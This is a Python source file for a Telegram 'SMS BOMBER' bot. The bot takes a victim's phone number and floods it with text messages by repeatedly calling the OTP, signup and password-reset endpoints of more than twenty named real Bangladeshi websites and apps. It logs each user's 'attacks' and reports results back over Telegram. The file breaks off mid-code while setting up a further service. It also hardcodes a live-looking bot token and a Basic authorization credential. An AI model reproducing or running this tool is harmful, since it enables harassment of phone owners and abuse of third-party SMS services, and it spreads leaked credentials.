#!/usr/bin/env python3
import requests
import time
import os
import sys
import json
import threading
import atexit
import signal
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Suppress warnings
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== FLASK APP (ONLY DECLARATION, NO THREAD) ====================
from flask import Flask
import os

app = Flask(__name__)

@app.route('/')
def home():
    return "🔥 SMS BOMBER BOT is running on Render!"

@app.route('/health')
def health():
    return "OK", 200
# =================================================================================

# Bot configuration
BOT_TOKEN = "8781609298:AAG6GxsYKPdFZkkyFYxaDhOBFeHO7PcnRls"

# File paths for data storage
USERS_FILE = "bot_users.json"
STATS_FILE = "bot_stats.json"
LOG_FILE = "bot_activity.log"

# Global variables
active_attacks = {}
bot_users = {}
bot_stats = {
    'total_users': 0,
    'total_attacks': 0,
    'total_messages': 0,
    'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    'server_status': 'ONLINE'
}

# Server shutdown flag
server_is_shutting_down = False
shutdown_initiated = False

# Load saved data
def load_data():
    global bot_users, bot_stats
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                bot_users = json.load(f)
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                bot_stats = json.load(f)
    except Exception as e:
        log_activity(f"Error loading data: {e}")

# Save data
def save_data():
    try:
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(bot_users, f, indent=2, ensure_ascii=False)
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(bot_stats, f, indent=2, ensure_ascii=False)
    except Exception as e:
        log_activity(f"Error saving data: {e}")

# Log activity
def log_activity(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    clean_message = message.encode('ascii', 'ignore').decode('ascii')
    log_entry = f"[{timestamp}] {clean_message}\n"
    print(log_entry, end='')
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {message}\n")
    except:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {clean_message}\n")

# Clear terminal and show header
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("="*60)
    print("          🔥 SMS BOMBER SERVER 🔥")
    print("          Developed by Mr.MorningStar")
    print("="*60)
    print(f"  Server Status: ONLINE")
    print(f"  Start Time: {bot_stats['start_time']}")
    print("="*60)
    print("")

# Notify all users
def notify_all_users(message):
    count = 0
    failed = 0
    for user_id, user_data in bot_users.items():
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                'chat_id': int(user_id),
                'text': message,
                'parse_mode': 'Markdown'
            })
            count += 1
            time.sleep(0.05)
        except Exception as e:
            failed += 1
            log_activity(f"Failed to notify user {user_id}: {e}")
    log_activity(f"Broadcast sent to {count} users (failed: {failed})")

# Admin force stop all attacks
def admin_stop_all():
    count = len(active_attacks)
    if count > 0:
        for user_id in list(active_attacks.keys()):
            active_attacks[user_id]['stop'] = True
        log_activity(f"ADMIN: Force stopped all {count} active attacks")
        print(f"\n✅ Force stopped {count} active attacks")
        notify_msg = "🔴 **ADMIN FORCE STOP**\n\nAll active attacks have been stopped by administrator."
        notify_all_users(notify_msg)
    else:
        print("\n✅ No active attacks to stop")

# Terminal command handler
def terminal_commands():
    while not server_is_shutting_down:
        try:
            cmd = input().strip()
            if cmd.startswith("broadcast "):
                msg = cmd[10:]
                print(f"\n📢 Broadcasting: {msg}")
                notify_all_users(msg)
            elif cmd == "stats":
                print(f"\n📊 Server Stats:")
                print(f"   Total Users: {bot_stats['total_users']}")
                print(f"   Total Attacks: {bot_stats['total_attacks']}")
                print(f"   Active Attacks: {len(active_attacks)}")
            elif cmd == "users":
                print(f"\n👥 User List:")
                for uid, data in bot_users.items():
                    print(f"   {data['first_name']} (@{data['username']}) - Attacks: {data['total_attacks']}")
            elif cmd == "stopall":
                admin_stop_all()
            elif cmd == "help":
                print("\n📋 Terminal Commands:")
                print("   broadcast <msg> - Send message to all users")
                print("   stats - Show server statistics")
                print("   users - List all users")
                print("   stopall - Force stop ALL active attacks")
                print("   clear - Clear screen")
                print("   exit - Stop server")
            elif cmd == "clear":
                clear_screen()
            elif cmd == "exit":
                print("\n🛑 Stopping server from terminal...")
                server_shutdown()
                os._exit(0)
            elif cmd != "":
                print(f"Unknown command: {cmd}. Type 'help' for available commands.")
        except EOFError:
            break
        except Exception as e:
            log_activity(f"Terminal command error: {e}")

# Server shutdown handler
def server_shutdown():
    global server_is_shutting_down, shutdown_initiated
    if server_is_shutting_down or shutdown_initiated:
        return
    shutdown_initiated = True
    server_is_shutting_down = True
    
    if bot_stats['server_status'] == 'ONLINE':
        bot_stats['server_status'] = 'OFFLINE'
        save_data()
        for user_id in list(active_attacks.keys()):
            active_attacks[user_id]['stop'] = True
        
        if bot_stats.get('total_users', 0) > 0:
            shutdown_msg = (
                "🔴 **SERVER SHUTDOWN NOTICE**\n\n"
                "The bot server is going offline.\n"
                "All active attacks have been stopped.\n\n"
                "The bot will be back online soon!\n"
                "Thank you for using @MorningStar_Bot"
            )
            print("\n" + "="*60)
            print("SENDING SHUTDOWN NOTIFICATION TO ALL USERS...")
            print("="*60)
            notify_all_users(shutdown_msg)
            print("="*60)
            print("SERVER SHUTDOWN COMPLETE")
            print("="*60)
        log_activity("Server shutting down - All users notified")

# Signal handlers
def signal_handler(sig, frame):
    print("\n\nReceived shutdown signal...")
    server_shutdown()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def cleanup():
    if not shutdown_initiated:
        server_shutdown()

atexit.register(cleanup)

def format_phone_number(number):
    """Format phone number"""
    if not number.startswith("+88"):
        if number.startswith("88"):
            full_number = "+" + number
        else:
            full_number = "+88" + number
    else:
        full_number = number
    
    clean_number = full_number.replace("+88", "")
    return full_number, clean_number

def track_user(user_id, username, first_name):
    """Track user information"""
    user_id_str = str(user_id)
    if user_id_str not in bot_users:
        bot_users[user_id_str] = {
            'username': username,
            'first_name': first_name,
            'first_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'total_attacks': 0,
            'total_messages': 0
        }
        bot_stats['total_users'] = len(bot_users)
        log_activity(f"New user! {username or first_name} (Total users: {bot_stats['total_users']})")
        save_data()
    else:
        bot_users[user_id_str]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        bot_users[user_id_str]['total_messages'] += 1
        save_data()

def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, username):
    """Run bombing with all sites - exactly like your original working script"""
    session = requests.Session()
    cycle_num = 0
    success = 0
    failed = 0
    MAX_CYCLES = 3
    
    # Update user stats
    user_id_str = str(user_id)
    if user_id_str in bot_users:
        bot_users[user_id_str]['total_attacks'] += 1
        bot_stats['total_attacks'] += 1
        save_data()
    
    log_activity(f"Attack started by {username} on {full_number}")
    
    # Send initial message
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
            'chat_id': chat_id,
            'text': f"⏱️ **Attack will auto-stop after {MAX_CYCLES} cycles**",
            'parse_mode': 'Markdown'
        })
    except:
        pass
    
    try:
        while user_id in active_attacks and not active_attacks[user_id].get('stop', False) and not server_is_shutting_down and cycle_num < MAX_CYCLES:
            cycle_num += 1
            cycle_success = 0
            cycle_failed = 0
            
            # Send cycle start
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': f"🔄 **CYCLE {cycle_num}/{MAX_CYCLES} STARTED**",
                    'parse_mode': 'Markdown',
                    'reply_markup': json.dumps({'inline_keyboard': [[{'text': '🛑 STOP ATTACK', 'callback_data': f'stop_{user_id}'}]]})
                })
            except:
                pass
            
            # 1. Shwapno - Working
            try:
                url_shwapno = "https://www.shwapno.com/api/auth"
                headers_shwapno = {
                    'accept': '*/*',
                    'content-type': 'application/json',
                    'origin': 'https://www.shwapno.com',
                    'referer': 'https://www.shwapno.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                res = session.post(url_shwapno, json={"phoneNumber": full_number}, headers=headers_shwapno, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Shwapno] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Shwapno] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Shwapno] ✗ Failed"
                })
            
            # 2. RedX - Working
            try:
                url_redx = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp"
                res = session.post(url_redx, json={"phoneNumber": clean_number}, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[RedX] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[RedX] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[RedX] ✗ Failed"
                })
            
            # 3. Bikroy - Working
            try:
                url_bikroy = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={clean_number}"
                res = session.get(url_bikroy, headers={"application-name": "web"}, timeout=5)
                if res.status_code == 200:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Bikroy] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Bikroy] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Bikroy] ✗ Failed"
                })
            
            # 4. GPFI - Working
            try:
                url_gp = "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp"
                headers_gp = {
                    'Content-Type': 'application/json',
                    'Origin': 'https://gpfi.grameenphone.com',
                    'Referer': 'https://gpfi.grameenphone.com/',
                    'User-Agent': 'Mozilla/5.0'
                }
                res = session.post(url_gp, json={"phone": raw_number, "email": "", "language": "en"}, headers=headers_gp, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[GPFI] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[GPFI] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[GPFI] ✗ Failed"
                })
            
            # 5. Paperfly - Working
            try:
                url_pf = 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php'
                data_pf = {"full_name": "Morning Star", "company_name": "abcd", "email_address": "ms@gmail.com", "phone_number": raw_number}
                res = session.post(url_pf, json=data_pf, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Paperfly] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Paperfly] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Paperfly] ✗ Failed"
                })
            
            # 6. Hishabee - Working with proper flow
            try:
                headers_h = {
                    "accept": "application/json, text/plain, */*",
                    "platform": "WEB", 
                    "user-agent": "Mozilla/5.0",
                    "origin": "https://web.hishabee.business",
                    "referer": "https://web.hishabee.business/"
                }
                
                # Step 1: Number Check
                check_url = f"https://app.hishabee.business/api/V2/number_check?mobile_number={clean_number}&country_code=88"
                session.post(check_url, headers=headers_h, timeout=5)
                time.sleep(0.5)
                
                # Step 2: Send OTP
                otp_url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={clean_number}&country_code=88"
                res = session.post(otp_url, headers=headers_h, timeout=5)
                
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    try:
                        res_json = res.json()
                        if 'message' in res_json:
                            status_text = f"[Hishabee] ✓ {res_json['message']}"
                        else:
                            status_text = f"[Hishabee] ✓ {res.status_code}"
                    except:
                        status_text = f"[Hishabee] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Hishabee] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Hishabee] ✗ Failed"
                })
            
            # 7. Osudpotro - Working
            try:
                url_osudhpotro = 'https://api.osudpotro.com/api/v1/users/send_otp'
                headers_osudhpotro = {
                    'content-type': 'application/json',
                    'origin': 'https://osudpotro.com',
                    'referer': 'https://osudpotro.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data = {
                    "mobile":"+88-"+raw_number,
                    "deviceToken": "web",
                    "language":  "en",
                    "os": "web"
                }
                res = session.post(url_osudhpotro, headers=headers_osudhpotro, json=data)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Osudpotro] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Osudpotro] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Osudpotro] ✗ Failed"
                })
            
            # 8. Sikho - Working
            try:
                url_sikho = 'https://api.shikho.com/auth/v2/send/sms'
                headers_sikho = {
                    'accept': 'application/json, text/plain, */*',
                    'content-type': 'application/json',
                    'origin': 'https://shikho.com',
                    'referer': 'https://shikho.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data = {
                    "phone":"88"+raw_number,
                    "type":"student",
                    "auth_type":"signup",
                    "vendor":"shikho"
                }
                res = session.post(url_sikho, headers=headers_sikho, json=data)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Sikho] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Sikho] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Sikho] ✗ Failed"
                })
            
            # 9. Kirei - Working
            try:
                url_kirei = 'https://frontendapi.kireibd.com/api/v2/send-login-otp'
                headers_kirei = {
                    "accept": "application/json, text/plain, */*",
                    "content-type": "application/json",
                    "origin": "https://kireibd.com",
                    "referer": "https://kireibd.com/",
                    "user-agent": "Mozilla/5.0",
                    "x-requested-with": "XMLHttpRequest"
                }
                data = {"email": raw_number}
                res = session.post(url_kirei, headers=headers_kirei, json=data)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Kirei] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Kirei] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Kirei] ✗ Failed"
                })
            
            # 10. Iqra Live - Fixed
            try:
                url_iqra = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{clean_number}"
                headers_iqra = {
                    'User-Agent': 'Mozilla/5.0',
                    'Accept': 'application/json'
                }
                res = session.get(url_iqra, headers=headers_iqra, timeout=5)
                if res.status_code == 200:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Iqra Live] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Iqra Live] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Iqra Live] ✗ Failed"
                })
            
            # 11. Swap - Working
            try:
                url_swap = "https://api.swap.com.bd/api/v1/send-otp/v2"
                headers_swap = {
                    'User-Agent': 'Mozilla/5.0',
                    'Content-Type': 'application/json'
                }
                data_swap = {"phone": clean_number}
                res = session.post(url_swap, json=data_swap, headers=headers_swap, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Swap] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Swap] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Swap] ✗ Failed"
                })
            
            # 12. Shadhin WiFi - Working
            try:
                url_shadhin = "https://backend.shadhinwifi.com/api/v2/apps/send_message"
                headers_shadhin = {
                    'User-Agent': 'Mozilla/5.0',
                    'Content-Type': 'application/json'
                }
                data_shadhin = {
                    "send_to": clean_number,
                    "auth_id": "null",
                    "sms_type": "otp_verification"
                }
                res = session.post(url_shadhin, json=data_shadhin, headers=headers_shadhin, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Shadhin WiFi] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Shadhin WiFi] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Shadhin WiFi] ✗ Failed"
                })
            
            # 13. Praava Health - Fixed
            try:
                url_praava = "https://cms.beta.praavahealth.com/api/v2/user/login/"
                headers_praava = {
                    'User-Agent': 'Mozilla/5.0',
                    'Content-Type': 'application/json'
                }
                data_praava = {"mobile": clean_number}
                res = session.post(url_praava, json=data_praava, headers=headers_praava, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Praava Health] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Praava Health] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Praava Health] ✗ Failed"
                })
            
            # 14. Easy.com - Working
            try:
                url_easy = "https://core.easy.com.bd/api/v1/registration"
                headers_easy = {
                    'User-Agent': 'Mozilla/5.0',
                    'Content-Type': 'application/json'
                }
                data_easy = {
                    "password": "easy123",
                    "password_confirmation": "easy123",
                    "device_key": "44818de9280e1419d3d63a2b65d8c33d",
                    "name": "User",
                    "mobile": clean_number,
                    "social_login_id": "",
                    "email": "user@gmail.com"
                }
                res = session.post(url_easy, json=data_easy, headers=headers_easy, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Easy.com] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Easy.com] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Easy.com] ✗ Failed"
                })
            
            # 15. Binge Buzz - Working
            try:
                url_binge = f"https://ss.binge.buzz/otp/send/phone={clean_number}"
                headers_binge = {
                    'User-Agent': 'Mozilla/5.0',
                    'Accept': 'application/json'
                }
                res = session.get(url_binge, headers=headers_binge, timeout=5)
                if res.status_code in [200, 201]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Binge Buzz] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Binge Buzz] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Binge Buzz] ✗ Failed"
                })
            
            # 16. Ultranet - Fixed timeout
            try:
                url_ultra = f"https://ultranetrn.com.br/fonts/api.php?number={clean_number}"
                headers_ultra = {
                    'User-Agent': 'Mozilla/5.0',
                    'Accept': 'application/json'
                }
                res = session.get(url_ultra, headers=headers_ultra, timeout=3)
                if res.status_code == 200:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Ultranet] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Ultranet] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Ultranet] ✗ Timeout"
                })
            
            # 17. Doctime - Fixed
            try:
                url_doctime = "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber"
                headers_doctime = {
                    'User-Agent': 'Mozilla/5.0',
                    'Content-Type': 'application/json'
                }
                data_doctime = {
                    "data": {
                        "country_calling_code": "88",
                        "contact_no": clean_number,
                        "headers": {"PlatForm": "Web"}
                    }
                }
                res = session.post(url_doctime, json=data_doctime, headers=headers_doctime, timeout=5)
                if res.status_code in [200, 201]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Doctime] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Doctime] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Doctime] ✗ Failed"
                })
            
            # 18. Softmax - Fixed
            try:
                url_softmax = "https://softmaxmanager.xyz/api/v1/user/request/otp/"
                headers_softmax = {
                    'authorization': 'Basic c29zOjI3TTMjYTRz',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0'
                }
                data_softmax = f"phone_number=%2B88{clean_number}&app_signature=Fu89B%2BdY9dz"
                res = session.post(url_softmax, data=data_softmax, headers=headers_softmax, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Softmax] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Softmax] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Softmax] ✗ Failed"
                })
            
            # 19. Bioscope - Fixed
            try:
                url_bioscope = "https://api-dynamic.bioscopelive.com/v2/auth/login"
                params_bioscope = {"country": "BD", "platform": "web", "language": "en"}
                headers_bioscope = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://www.bioscopelive.com',
                    'referer': 'https://www.bioscopelive.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_bioscope = {"phone": f"+88{clean_number}"}
                res = session.post(url_bioscope, params=params_bioscope, json=data_bioscope, headers=headers_bioscope, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Bioscope] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Bioscope] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Bioscope] ✗ Failed"
                })
            
            # 20. BanglaFlix Signup - Working
            try:
                url_bf_signup = "https://banglaflix.com.bd/signin/signupsubmit"
                headers_bf_signup = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://banglaflix.com.bd',
                    'Referer': 'https://banglaflix.com.bd/signin',
                    'User-Agent': 'Mozilla/5.0'
                }
                data_bf_signup = f"msisdn-signup=88{clean_number}&register-submit=Sign+Up"
                res = session.post(url_bf_signup, data=data_bf_signup, headers=headers_bf_signup, timeout=5)
                if res.status_code in [200, 302]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[BanglaFlix Signup] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[BanglaFlix Signup] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[BanglaFlix Signup] ✗ Failed"
                })
            
            # 21. BanglaFlix Forgot - Working
            try:
                url_bf_forgot = "https://banglaflix.com.bd/signin/forgotpassword"
                headers_bf_forgot = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://banglaflix.com.bd',
                    'Referer': 'https://banglaflix.com.bd/signin/signupsubmit',
                    'User-Agent': 'Mozilla/5.0'
                }
                data_bf_forgot = f"msisdn-forgot=88{clean_number}&forgot-submit=Send+Password"
                res = session.post(url_bf_forgot, data=data_bf_forgot, headers=headers_bf_forgot, timeout=5)
                if res.status_code in [200, 302]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[BanglaFlix Forgot] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[BanglaFlix Forgot] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[BanglaFlix Forgot] ✗ Failed"
                })
            
            # 22. Binge API - Working
            try:
                url_binge_api = f"https://web-api.binge.buzz/api/v3/otp/send/+88{clean_number}"
                headers_binge_api = {
                    'Device-Type': 'web',
                    'User-Agent': 'Mozilla/5.0',
                    'Accept': 'application/json'
                }
                res = session.get(url_binge_api, headers=headers_binge_api, timeout=5)
                if res.status_code in [200, 201]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Binge API] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Binge API] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Binge API] ✗ Failed"
                })
            
            # 23. Hoichoi Signin - Fixed
            try:
                url_hoichoi_signin = "https://prod-api.viewlift.com/identity/signin"
                params_hoichoi = {"site": "hoichoitv"}
                headers_hoichoi = {
                    'content-type': 'application/json',
